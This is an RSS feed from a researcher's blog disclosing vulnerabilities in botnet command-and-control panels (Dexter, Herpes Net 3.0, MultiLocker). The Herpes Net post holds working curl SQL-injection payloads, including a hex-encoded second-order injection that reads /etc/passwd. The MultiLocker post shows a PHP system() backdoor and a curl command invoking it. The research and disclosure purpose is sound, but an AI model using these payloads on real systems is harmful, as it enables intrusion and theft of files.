<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Botnet on @botnet_hunter&#39;s blog</title>
    <link>https://bwall.github.io/tags/botnet/</link>
    <description>Recent content in Botnet on @botnet_hunter&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Â© 2015 Copyright Brian Wallace</copyright>
    <lastBuildDate>Sun, 16 Mar 2014 10:19:07 -0700</lastBuildDate>
    <atom:link href="https://bwall.github.io/tags/botnet/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Murdering Dexter</title>
      <link>https://bwall.github.io/murdering-dexter/</link>
      <pubDate>Sun, 16 Mar 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/murdering-dexter/</guid>
      <description>

&lt;p&gt;Occasionally, I like to build a vulnerable virtual machine demonstating a recently published vulnerability.  One of the reasons I do this is because such a small section of the industry is exposed to botnet panels, and the easiest way to get acquianted is by pwning them.  It also gives people an opportunity to legally use my exploits without hunting down the source code for the command and control panels themselves.  In this vulnerable virtual machine, you get an opportunity to &amp;ldquo;Murder Dexter&amp;rdquo;, the point of sale malware.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&#34;murdering-dexter:0635b995738305bfac88ff5fd882f446&#34;&gt;Murdering Dexter&lt;/h1&gt;

&lt;p&gt;Much like my other vulnerable virtual machines, there are no supplied credentials.  The virtual machine itself uses DHCP to get an IP address, and while it does not need Internet access itself, you may wish to reference the Internet for some portions.  If you need to change something in the virtual machine in order to use it, you should be able to edit the shadow file in a live cd without hindering the challenge.&lt;/p&gt;

&lt;h1 id=&#34;download:0635b995738305bfac88ff5fd882f446&#34;&gt;Download&lt;/h1&gt;

&lt;p&gt;Download locations can be found &lt;a href=&#34;http://vulnhub.com/entry/bot-challenges-dexter,59/&#34;&gt;here&lt;/a&gt; as well as other information.&lt;/p&gt;

&lt;h1 id=&#34;credits:0635b995738305bfac88ff5fd882f446&#34;&gt;Credits&lt;/h1&gt;

&lt;p&gt;Thanks to everyone who beta tested this virtual machine!&lt;/p&gt;

&lt;h2 id=&#34;testers:0635b995738305bfac88ff5fd882f446&#34;&gt;Testers&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Andrew Morris (@TheAndrewBalls)&lt;/li&gt;
&lt;li&gt;Bas (@barrebas)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;developer:0635b995738305bfac88ff5fd882f446&#34;&gt;Developer&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Brian Wallace (@botnet_hunter)&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Herpes Net 3.0 SQLi</title>
      <link>https://bwall.github.io/herpes-net-3.0-sqli/</link>
      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/herpes-net-3.0-sqli/</guid>
      <description>&lt;p&gt;During my talk at RSAC 2014, we announced multiple botnet vulnerabilities which had been discovered.  The following vulnerability is one of them.  Herpes Net is botnet with a wide range of functions, with everything from opening the CD tray to mining bitcoins (via plugins).  With a vulnerability in the command and control panel, we can get information on the botnet operator.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;When this vulnerability was discovered by myself, I had thought it was a rediscovery of a &lt;a href=&#34;https://code.google.com/p/malware-lu/wiki/en_analyse_herpnet&#34;&gt;vulnerability&lt;/a&gt; discovered by malware.lu.  Upon further investigation into their proof of concept, I found that the parameter they are injecting on no longer exists.  Instead of injecting on the &amp;lsquo;id&amp;rsquo; parameter, we can inject on the the &amp;lsquo;hwid&amp;rsquo; parameter.  The following is the vulnerable code (only relevant code displayed).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	$hwid = $_POST[&#39;hwid&#39;];
	if($header == &amp;quot;74978b6ecc6c19836a17a3c2cd0840b0&amp;quot;)
	{
		if ($hwid &amp;lt;&amp;gt; &amp;quot;&amp;quot;)
		{
			$bottest = mysql_query(&amp;quot;SELECT * FROM clients WHERE hwid = &#39;$hwid&#39;&amp;quot;);
			while($row = mysql_fetch_array($bottest))
		 	{$id = $row[&#39;id&#39;];}
			if(mysql_num_rows($bottest) == 1){
				$result = mysql_query(&amp;quot;SELECT * FROM commands WHERE botid = &#39;$id&#39; AND viewed = &#39;0&#39; LIMIT 1&amp;quot;);
				while($row = mysql_fetch_array($result))
				{
					echo $row[&#39;cmd&#39;].&amp;quot;|&amp;quot;.$row[&#39;variable&#39;];
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A keen eye will notice that there are two vulnerable queries in this code selection.  The first query, while injectable, does not have a direct influence on output.  While blind SQL injection is not improbable, it does make for quite a bit more noise when trying to extract information.  Just for reference though, here is a proof of concept blind SQLi.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -A &amp;quot;74978b6ecc6c19836a17a3c2cd0840b0&amp;quot; -v http://c2.com/panels/herpes/run.php -d &amp;quot;hwid=&#39; AND 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,BENCHMARK(10000, SLEEP(1000)) -- --&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This should sleep for quite a while if exploited successfully.  If only we can get a result from the database to print out, we could use a much simpler, faster and quieter exploit.  If we return a SQL injection payload from the first query, we can exploit the next one, and return data to be read.  Here is what we want in our second query&amp;rsquo;s payload for a proof of concept.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&#39; AND 1=2 UNION ALL SELECT 1,2,load_file(&#39;/etc/passwd&#39;),4,5 -- --
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In order to do that, we should hex encode it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And now our proof of concept looks like the following.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -A &amp;quot;74978b6ecc6c19836a17a3c2cd0840b0&amp;quot; -v http://c2.com/panels/herpes/run.php -d &amp;quot;hwid=&#39; AND 1=2 UNION ALL SELECT 0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d,2,3,4,5,6,7,8,9 -- --&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The data returned will be followed by &amp;lsquo;|4&amp;rsquo; as that is what is being returned in the &amp;lsquo;variable&amp;rsquo; row.  We can of course control this value as well if needed.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/bwall/BAMF/blob/master/IntegrationQueue/http/herpesnet/herpesnet.class.py&#34;&gt;Here&lt;/a&gt; is a proof of concept which uses this second order SQL injection to extract the bot information from the database.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>MultiLocker Backdoor</title>
      <link>https://bwall.github.io/multilocker-backdoor/</link>
      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/multilocker-backdoor/</guid>
      <description>&lt;p&gt;In a recent search through some underground communities, I came across the source code to a version of the MultiLocker panel.  With ransomware, the security industry is always looking for a good way to resolve the issue without the ransom being paid.  This could potentially be done by gathering information from the botnet&amp;rsquo;s panel.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;While there are likely other vulnerabilities, this one stood out after a quick grep of the code.  In the &amp;lsquo;lending/PL.php&amp;rsquo;, there is some obvious backdoor code.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if (!empty($_POST[&#39;c&#39;]))
{
system($_POST[&#39;c&#39;]);
die();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This can easily be accessed with curl or wget (let&amp;rsquo;s assume &lt;a href=&#34;http://c2.panel/&#34;&gt;http://c2.panel/&lt;/a&gt; is the MultiLocker panel root).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;curl -v -d &amp;quot;c=whoami&amp;quot; http://c2.panel/lending/PL.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;For more information on MultiLocker, you can check out a great blog post on it &lt;a href=&#34;http://www.xylibox.com/2012/11/multi-locker.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>RSAC 2014 Botnet Vulnerabilities</title>
      <link>https://bwall.github.io/rsac-2014-botnet-vulnerabilities/</link>
      <pubDate>Sun, 09 Mar 2014 10:19:07 -0700</pubDate>
      
      <guid>https://bwall.github.io/rsac-2014-botnet-vulnerabilities/</guid>
      <description>

&lt;p&gt;This year at RSAC 2014, Stuart McClure and myself did a talk titled Hacking Exposed: Art of Deterrence.  During this talk, we announced various botnet vulnerabilities which had not been previously disclosed and some that had been.  Here I will document some of them.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h1 id=&#34;dexter:160628beaf4e25343949f61770a22914&#34;&gt;Dexter&lt;/h1&gt;

&lt;p&gt;Dexter, the POS malware was the botnet in the primary focus of the talk.  There were 2 exploits released prior to RSAC, with slightly different objectives.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://raw.github.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/dexter_casinoloader_exec.rb&#34;&gt;Dexter MSF Module&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://raw.github.com/bwall/BAMF/master/IntegrationQueue/http/dexter.PoC.py&#34;&gt;Dexter BAMF PoC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;madness-pro:160628beaf4e25343949f61770a22914&#34;&gt;Madness Pro&lt;/h1&gt;

&lt;p&gt;Madness Pro is a botnet focused on denial of service attacks.  The exploit for this botnet is not yet public as it is still very effective and there are still major versions of this botnet at large.  This exploit can be released upon request.&lt;/p&gt;

&lt;h1 id=&#34;herpes-net-3-0:160628beaf4e25343949f61770a22914&#34;&gt;Herpes Net 3.0&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bwall.github.io/herpes-net-30-sqli.html&#34;&gt;Herpes Net 3.0 SQLi&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;multilocker:160628beaf4e25343949f61770a22914&#34;&gt;MultiLocker&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bwall.github.io/multilocker-backdoor.html&#34;&gt;MultiLocker Backdoor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>